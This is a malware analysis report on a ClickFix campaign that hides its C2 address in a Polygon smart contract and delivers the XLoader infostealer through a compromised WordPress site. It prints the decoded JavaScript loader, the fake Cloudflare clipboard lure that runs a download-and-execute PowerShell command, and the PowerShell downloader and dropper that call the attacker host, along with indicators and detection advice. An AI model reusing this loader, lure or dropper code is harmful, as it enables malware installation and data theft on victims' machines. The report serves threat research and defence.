# Analysis report — ClickFix → EtherHiding (Polygon) → XLoader

- **Analyst tool:** reaper
- **Date:** 2026-07-28
- **Sample family:** ClearFake / ClickFix, EtherHiding-staged, XLoader/Formbook payload
- **Targeting:** Windows browser users on compromised WordPress sites
- **Companion files:** `README.md` (walkthrough), `SHA256SUMS` (artifact integrity), `artifacts/` (every payload referenced below)

## 1. Sample identification

| Artifact | Path | Size | SHA-256 |
|---|---|---|---|
| Minimal fixture (injected loader + HTML shell) | `sample.html` | 3 738 B | `61caeb0dadb6f2cdf5d685cf6a82a9379b5c685a75839c166ae5a899ff49095e` |
| Stage-1 loader (obfuscated `<script>` body) | `artifacts/stage1-loader/loader.js` | 2 964 B | `471d2d3653e58e6f91c9acd57b384fe9579638865f07e64b3f0b58c4b0ef06c1` |
| Stage-1 loader base64 argument | `artifacts/stage1-loader/loader.b64` | — | `c7985d20afd6f2713c7fb1bf2b12a6fba5080a98582228caf24ed718ed57b579` |
| Stage-1 loader decoded (plaintext) | `artifacts/stage1-loader/loader.deobf.js` | 2 034 B | `8ab5936d651b206490c916a787597c39efbcf5488a9969fbffab7dac54661468` |
| Stage-2 contract read (JSON-RPC reply) | `artifacts/stage2-contract/eth_call-response.json` | — | `7aa606c3ad0e41bc02fc843100d0832ea4901c9f319290bfbcfc19c3faa95eb0` |
| Stage-2 decoded C2 string | `artifacts/stage2-contract/c2-string.txt` | — | `03ed12daf36ef23436db182ee00ef70a6ad65d018ad063acc10b6a7f9331af3c` |
| Stage-3 ClickFix overlay (as served) | `artifacts/stage3-clickfix/api.js` | 44 048 B | `33b56124a82cbd24f713209e4cbbf14daf4dd917615e8531fea3782953819c06` |
| Stage-3 ClickFix overlay (decoded) | `artifacts/stage3-clickfix/api.deobf.js` | 32 763 B | `287adee00a0139ddedac476aee4d393cc962fba9c6cd5d05c0fb95bab2c4f5b6` |
| Stage-4 downloader (decoded) | `artifacts/stage4-powershell/1.downloader.deobf.ps1` | — | `09924ac4e0fa9ac69ab1e1045f234dbda89807cac147a2c6cc1d3f3047d699b3` |
| Stage-4 dropper (decoded) | `artifacts/stage4-powershell/3.dropper.deobf.ps1` | — | `69b92e0e6566ab45e029fc4be051d701cde3ff8539d48f9059ec9d83b37e3d7c` |

The loader was captured from the homepage of **`www.cocobproductions.com`**, a WordPress site running Elementor / Elementor Pro, the `hello-elementor` theme, RevSlider, and bdthemes Element Pack, fronted by Sucuri + Cloudflare. The malicious `<script>` sits inline among the legitimate first-party WordPress/Elementor tags, consistent with injection into a theme template, a plugin, or the database rather than a one-off page edit.

## 2. Executive summary

This is a **ClickFix** campaign: the end goal is to trick the victim into running a native command on their own machine, defeating every browser and download-based control by making the human the delivery mechanism. The browser-side C2 address is concealed with **EtherHiding**: it is read from a smart contract on **Polygon mainnet**, so there is no fixed JavaScript C2 hostname in the page and the lookup is indistinguishable from ordinary public-RPC traffic.

The chain has six stages:

1. **Stage 1 — loader.** An inline `<script>` on the compromised page: `atob(...)` → single-byte **XOR (key 12)** → `new Function(...)()`. The decoded loader queries Polygon and injects the next stage.
2. **Stage 2 — on-chain C2 lookup.** `eth_call` to contract `0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2`, selector `0xb68d1809`, iterating eight fallback RPC endpoints. The ABI-decoded return string is the C2 base: `https://enter-code-cdn.info`. The loader injects `<script src="https://enter-code-cdn.info/api.php?s=<marker>&_v=<epoch-minute>">`.
3. **Stage 3 — ClickFix overlay.** `/api.php` returns a 44 KB blob (`atob` + **XOR key 177** + `new Function`) that renders a full-screen **fake Cloudflare "verify you are human"** overlay in 11 languages, AES-GCM-encrypts victim telemetry back to `/api.php`, and copies the PowerShell lure to the clipboard.
4. **Stage 4 — PowerShell downloader.** The lure runs `powershell -w h "iex(irm 'enter-code-cdn.info/<16hex>' …)"`. That endpoint returns a byte array XOR-`42` → `[scriptblock]::Create` → a `WinHttpRequest` GET of `/<16hex>?_=1`.
5. **Stage 5 — PowerShell dropper.** `/<16hex>?_=1` returns nested XOR-`77`/base64 layers that resolve to a dropper: download a 7-Zip extractor + a password-protected archive, extract `xloader.exe`, `Start-Process` it, delete the archive, ping a success beacon.
6. **Stage 6 — native payload.** `xloader.exe`, a packed **XLoader / Formbook** infostealer, bloated to 819 MB to defeat AV/sandbox size caps.

reaper recovered every JavaScript stage statically; the PowerShell layers are simple XOR arrays decoded with the reproduction steps in the README. The single on-chain read reuses `examples/etherhiding/fetch-evm-payload.mjs` with Polygon flags.

### 2.1 On-chain C2, and why it is the strongest IOC

The C2 hostname lives in contract storage, not in the page. Two independent Polygon RPC providers returned identical bytes decoding to `https://enter-code-cdn.info` (`artifacts/stage2-contract/`). The operator can rotate the C2 for every compromised site at once by sending a single transaction to the contract, without editing any victim page. That makes the **contract address `0xB6bC9e1D…C1f2` + selector `0xb68d1809`** the most durable indicator: the RPC endpoints, the XOR scheme, and the C2 hostname are all replaceable, but the contract is fixed until the operator redeploys.

## 3. Attack chain, stage by stage

### 3.1 Stage 1 — the injected loader

The compromised page carries one inline script of the form:

```js
!function(){var _0x9daa=atob('JGp5Ym94ZWNi…'),_0xd730=12,
  _0x64de=new Uint8Array(_0x9daa.length),_0x6e8f=0;
  for(;_0x6e8f<_0x9daa.length;_0x6e8f++)
    _0x64de[_0x6e8f]=_0x9daa.charCodeAt(_0x6e8f)^_0xd730;
  (new Function(new TextDecoder().decode(_0x64de)))();}();
```

The obfuscation is deliberately un-fancy: base64 in the source (so a scanner sees only an opaque string), one XOR byte (`_0xd730 = 12`) to defeat plain `grep`, and `new Function` instead of `eval`. reaper's default scan flags exactly this shape (`atob`, a 2 712-char high-entropy string literal, and the `new Function` sink) without decoding anything.

### 3.2 Stage 1 (continued) — what the loader does

XOR-12 decoding yields ~30 lines (`artifacts/stage1-loader/loader.deobf.js`). Renamed for readability:

```js
(function () {
  if (window['_53f691a553']) return;           // run-once guard
  window['_53f691a553'] = 1;
  var marker   = "d337fe5678dbf1893653249a44964fe325f0428d2f4be1ae";
  var rpcs     = ['https://polygon-mainnet.public.blastapi.io',
                  'https://1rpc.io/matic', 'https://rpc.ankr.com/polygon',
                  'https://polygon-public.nodies.app',
                  'https://polygon.gateway.tenderly.co', 'https://polygon.drpc.org',
                  'https://polygon-bor-rpc.publicnode.com',
                  'https://rpc-mainnet.matic.quiknode.pro'];
  var contract = "0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2";
  var selector = "b68d1809";

  function abiDecodeString(hex) { /* offset@0, length@64, data@128 — hand-rolled ABI string */ }

  function tryRpc(i) {                            // iterate RPCs until one answers
    if (i >= rpcs.length) return Promise.resolve(null);
    var body = { jsonrpc: '2.0', method: 'eth_call',
                 params: [{ to: contract, data: '0x' + selector }, 'latest'], id: 1 };
    return post(rpcs[i], body)
      .then(r => { var s = r && r.result ? abiDecodeString(r.result) : '';
                   return s ? s.replace(/\/+$/, '') : tryRpc(i + 1); })
      .catch(() => tryRpc(i + 1));
  }

  function inject(base) {
    var el = document.createElement('script');
    el.src = base + '/api.php?s=' + marker + '&_v=' + Math.floor(Date.now() / 60000);
    el.async = true;
    (document.head || document.body).appendChild(el);
  }
  tryRpc(0).then(base => { if (base) inject(base); });
})();
```

The `abiDecodeString` routine is a hand-rolled Solidity ABI decoder for a single `string` return: 32 bytes offset (`0x20`), 32 bytes length, then the UTF-8 bytes. The eight RPC endpoints are load-balancing/resilience: any public Polygon RPC serves the read. The `_v` parameter is a per-minute cache-buster. `marker` (`d337fe…be1ae`) is the campaign/victim tag echoed to `/api.php`.

### 3.3 Stage 2 — the on-chain read

`eth_call` with `to = 0xB6bC9e1D…C1f2`, `data = 0xb68d1809`, block `latest`. The 96-byte return (`artifacts/stage2-contract/eth_call-result.hex`) ABI-decodes to a 27-byte string:

```
https://enter-code-cdn.info
```

The host resolves to `178.16.52.101` (AS202412, Omegatech LTD), nginx. This is the only hostname the whole browser chain ever contacts directly, and it is not present anywhere in the page source.

### 3.4 Stage 3 — the ClickFix overlay

`GET /api.php?s=<marker>&_v=<epoch-minute>` returns `application/javascript`: a 44 KB blob using the loader's scheme with **XOR key 177** (`artifacts/stage3-clickfix/api.js` → `api.deobf.js`). Decoded, it is the ClickFix engine. Notable behaviour:

- **Run-once fingerprint.** `_SK` is an **FNV-1a** hash of `campaign_key \x00 hostname`, used as a `localStorage` key so the overlay fires once per victim host.
- **Encrypted victim beacon.** It SHA-256s the campaign key `K`, imports it as an **AES-GCM** key, and encrypts `{url, referrer, vid}` (a random UUID) before POSTing it to `/api.php?k=…&d=…` (with a plaintext `fetch` fallback). This gives the operator per-victim telemetry that is opaque on the wire.
- **Fake Cloudflare overlay.** A full-screen `verify-window` styled to imitate Cloudflare's "verify you are human" interstitial, complete with a spoofed **`Ray ID:`**. The instruction text is localised into **11 languages** (English, French, Spanish, Italian, Portuguese, German, Turkish, Arabic, Japanese, Chinese, Korean), each walking the victim through pressing the **Windows key** ("located at the bottom of your keyboard between Ctrl and Alt") → `R` → paste → Enter.
- **Clipboard write.** On the fake "verify" gesture it calls `navigator.clipboard.writeText` (with a legacy `execCommand('copy')` fallback via a hidden `<textarea>`) with the assembled PowerShell command.
- **Header flags.** `OS="windows"`, `HF=true`, `T=false`: this build is Windows-only; non-Windows visitors are not served the lure.

### 3.5 Stage 3 (continued) — the clipboard command

```
powershell -w h "iex(irm 'enter-code-cdn.info/<16hex>' -UseBasicParsing)"; exit <#<ray>#>
```

Assembled in the overlay as `cmdUrl + '; exit ' + '<#' + ray + '#>'`. Breakdown:

- `-w h` = `-WindowStyle Hidden`, no visible console.
- `iex(irm '…' -UseBasicParsing)` = `Invoke-Expression(Invoke-RestMethod …)`: download-and-run in memory, nothing written to disk.
- `; exit <#<ray>#>`: the `<# … #>` is a PowerShell **block comment** holding the same spoofed Cloudflare "Ray ID" shown in the overlay. Its only purpose is to make the pasted string look like it carries a legitimate verification code, reinforcing the captcha story.
- The **16-hex path is minted fresh per visit.** The path first observed in the wild (`ef41f64bdf47f6c7`) had already rotated to `404` by analysis time; the live overlay handed out `2e4c20ee0bea3120`. The `/<hash>` route is distinguishable from the server's `403` baseline (unknown paths `403`, the real hash route and `<hash>.php` return content/`404`), i.e. it is a real per-victim endpoint, likely one-time or short-TTL.

### 3.6 Stage 4 — PowerShell downloader

`GET /<hash>` with a PowerShell/WinHTTP user-agent returns `text/plain` PowerShell (`artifacts/stage4-powershell/1.downloader.as-served.ps1`): a `@(…)` byte array joined via `[char]($_ -bxor 42)` and run with `[scriptblock]::Create`. Decoded (`1.downloader.deobf.ps1`):

```powershell
$url = -join(@(…) | % { [char]($_ -bxor 51) })          # → http://enter-code-cdn.info/<hash>?_=1
$req = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$req.Open("GET", $url); $req.Send()
& ([scriptblock]::Create(-join($req.ResponseBody | % { [char]$_ })))
```

It fetches the same path with `?_=1` over WinHTTP (a different client than `irm`, so it does not re-trigger the `irm` path's gating) and executes the response.

### 3.7 Stage 5 — PowerShell dropper

`/<hash>?_=1` returns a larger blob prefixed with `<#<hash>#>`: a byte array XOR-`77`, whose bytes join into base64, which decodes to another script that base64-decodes once more and XORs with `76` before `iex`: three mechanical layers. The fully unwrapped result is the dropper (`artifacts/stage4-powershell/3.dropper.deobf.ps1`):

```powershell
Start-Sleep -Seconds 20                                  # sandbox-timeout evasion
$pw   = [Convert]::FromBase64String('cGFzc3dvcmQxMjM0')  # → "password1234"
$exe  = -join(@(…) | % {[char]($_ -bxor 35)})            # → http://enter-code-cdn.info/7z   (7za.exe)
$arc  = -join(@(…) | % {[char]($_ -bxor 25)})            # → http://enter-code-cdn.info/<64hex> (.7z)
# download 7za + archive to random %TEMP% dirs (3 retries)…
& $exe x -y -p$pw -o$dir $arcfile                        # extract with password
# fallback: [IO.Compression.ZipFile]::ExtractToDirectory
$fp = [IO.Directory]::GetFiles($dir,'xloader.exe','AllDirectories')|Select -First 1
if ($fp) { Start-Process -FilePath $fp }                 # run it
[IO.File]::Delete($arcfile)                              # clean the archive
$beacon = -join(@(…) | % {[char]($_ -bxor 112)})         # → http://enter-code-cdn.info/p/<64hex>
[void]$wc.DownloadString($beacon)                        # success ping
```

Decoded URLs and the archive password are in `artifacts/stage4-powershell/dropper-iocs.txt`. The 20-second `Start-Sleep`, the password-protected archive, and the legitimate-7-Zip unpacker are all evasions: they stall short-lived sandboxes, block inline archive scanning, and keep the unpack logic out of the malware itself.

### 3.8 Stage 6 — the XLoader payload (metadata only)

The archive (`/<64hex>`, pw `password1234`) contains a single file, `xloader.exe`. Facts (full record in `artifacts/stage5-payload/README-native-payload.txt`; the binary is **not** committed):

- **PE32+ / x86-64 / GUI**, 7 sections, `SizeOfImage` 278 528, compiled **2026-07-10** (one day before the archive was packed).
- **819 450 880 bytes on disk, but only ~250 KB is real**: the remaining 781 MB (100.0 % of the tail) is `0x00` padding. The `.7z` is 230 KB on the wire and inflates ~3 500× on extraction.
- Minimal imports (`KERNEL32`, `USER32`, `GDI32`, `ole32`, `OLEAUT32`) plus `IsDebuggerPresent`, `VirtualProtect`, `LoadLibraryExW`, `GetProcAddress`, `CreateThread`: a packed stub that unpacks in memory and checks for a debugger. Consistent with **XLoader / Formbook**, whose C2 configuration is encrypted inside the stub and not recoverable statically.

The file bloat is the headline evasion: many AV/EDR and sandbox pipelines skip files above a size cap (commonly 100–500 MB), so the extracted binary is never scanned or auto-submitted, while its tiny compressed form moves quickly and cheaply.

## 4. Indicators

### 4.1 Browser-side staging

| Type | Value | Notes |
|---|---|---|
| Compromised site | `www.cocobproductions.com` | WordPress + Elementor, behind Sucuri/Cloudflare |
| Loader shape | inline `<script>` `atob → XOR12 → new Function` | Not obfuscator.io; single-byte XOR |
| Blockchain | Polygon (POS) mainnet | Read-only relay; no gas, no signed tx |
| **C2 contract** | **`0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2`** | Strongest IOC; stores the C2 hostname |
| **Function selector** | **`0xb68d1809`** | Accessor returning the ABI-encoded C2 string |
| RPC endpoints | 8× public Polygon RPCs (blastapi, 1rpc, ankr, nodies, tenderly, drpc, publicnode, quiknode) | Benign infra abused as a relay; replaceable |
| Campaign marker | `d337fe5678dbf1893653249a44964fe325f0428d2f4be1ae` | `s=`/`k=` param echoed to `/api.php` |
| C2 host | `enter-code-cdn.info` → `178.16.52.101` (AS202412 Omegatech LTD) | nginx |
| Overlay endpoint | `enter-code-cdn.info/api.php` | ClickFix JS + AES-GCM victim beacon |
| Sink (browser stages) | `new Function(TextDecoder.decode(XOR(atob(...))))` | Same primitive at both browser layers |

### 4.2 PowerShell + native delivery

| Type | Value | Notes |
|---|---|---|
| Lure command | `powershell -w h "iex(irm 'enter-code-cdn.info/<16hex>' -UseBasicParsing)"; exit <#<ray>#>` | 16-hex path minted per visit; `<# #>` = spoofed Ray ID |
| Stage paths | `/<16hex>`, `/<16hex>?_=1` | PowerShell downloader + dropper (`bxor 42`, `bxor 77`) |
| Extractor | `enter-code-cdn.info/7z` | 7za.exe · SHA-256 `26817725650583d99ca3e617a618dd75c0f71bd316b5761780b7361f5f824cad` |
| Archive | `enter-code-cdn.info/<64hex>` | `.7z`, pw `password1234` · SHA-256 `5120cc6dfbbb629310405145065fc433a7d64c48936403718903b95bc6491ab9` |
| **Payload** | `xloader.exe` | **SHA-256 `8826bebdbb2db70a451199e60189a179737ac5c4c383f7cc763ff73395e3de5a`** · PE32+ · 819 MB bloat |
| Success beacon | `enter-code-cdn.info/p/<64hex>` | `DownloadString` ping after execution |
| Host artifacts | random dirs under `%TEMP%` containing `<rand>.exe` (7za), `<rand>.7z`, `…\xloader.exe` | archive deleted post-extract |

## 5. Methodology — reaper features exercised

1. **HTML ingestion.** `reaper sample.html` pulls the inline `<script>` into a virtual sub-file and analyses the decoded JS.
2. **Default scan.** Surfaces the `atob`, high-entropy string, and `new Function` sink on the still-encoded loader with no decoding.
3. **`--triage` / `--iocs --defang`.** On the decoded loader, extracts the Polygon contract address + 8 RPC endpoints and returns a `SUSPICIOUS` verdict; on the decoded overlay, extracts `enter-code-cdn.info`, `/api.php`, and the spoofed `cloudflare.com`.
4. **`examples/etherhiding/fetch-evm-payload.mjs`.** Reused for the single on-chain read, driven onto Polygon with `--rpc https://polygon.drpc.org --selector 0xb68d1809`. This is the first non-BSC use of that helper and argues for promoting it from `examples/etherhiding/` to `scripts/` now that a second blockchain-staged sample exists.
5. **Manual XOR/base64 unwrapping.** The loader (XOR 12), overlay (XOR 177), and the three PowerShell layers (XOR 42 / 77+base64 / base64+XOR 76) are decoded with the one-liners in `README.md`; each browser layer's committed `*.deobf.*` is byte-for-byte reproducible.

## 6. Mitigations and detections

- **Content Security Policy (highest leverage).** A strict `script-src` that forbids inline `<script>` and unknown hosts stops the injected loader and the dynamically-injected `/api.php` tag. This single control breaks the browser chain.
- **Network egress (the on-chain read).** Where no Web3 activity is expected, alert on browser-origin `eth_call` POSTs to public Polygon RPCs, and specifically on any request whose `params[0].to` equals `0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2` or `params[0].data` begins `0xb68d1809`. Block `enter-code-cdn.info` / `178.16.52.101` outright.
- **The ClickFix technique itself.** The durable behavioural detection is not any one domain but the pattern: **`powershell` / `iex` / `irm` reaching the clipboard from a browser**, then a `powershell.exe` child of `explorer.exe` with `-w`/`-WindowStyle Hidden` and `iex(irm …)` on the command line. Alert on both. The `exit <# … #>` block-comment tail is a high-fidelity ClickFix signature.
- **Endpoint (the PowerShell chain).** Alert on `New-Object -ComObject WinHttp.WinHttpRequest`, `[scriptblock]::Create` fed from a downloaded body, and `-bxor` byte-array joins in PowerShell. Flag `Start-Process` of an executable extracted from a password-protected archive in `%TEMP%`.
- **Endpoint (the payload).** Treat multi-hundred-MB PEs unpacked from tiny archives as suspicious by default; do not let a size cap silently exclude them from scanning. Extraction of any file named `xloader.exe`, and `7za.exe` running against a `password1234`-protected archive, are direct hits.
- **Origin server.** Integrity-check the compromised WordPress core, plugins, themes, and database; grep `wp_posts` / `wp_options` and active theme templates for inline `<script>` containing `atob(` + `new Function`.

## 7. Limitations

- The **XLoader C2 configuration** is encrypted inside the packed stub and was not recovered; family attribution rests on the filename, packing, imports, and delivery pattern rather than an unpacked config. The binary itself is not committed (819 MB bloat + live infostealer); only its hashes and PE metadata are recorded.
- The `artifacts/` tree is a snapshot from **2026-07-28**. Both the on-chain C2 string and the per-visit 16-hex/64-hex paths rotate; re-fetches will differ, and the first-observed lure hash (`ef41f64bdf47f6c7`) was already dead at analysis time.
- Only selector `0xb68d1809` was probed on the contract; other selectors may serve decoys, kill switches, or per-region C2 strings. The contract's deployer address and transaction history (payload rotations) were not enumerated and are good follow-up pivots.
- The compromise vector on `cocobproductions.com` is out of scope.
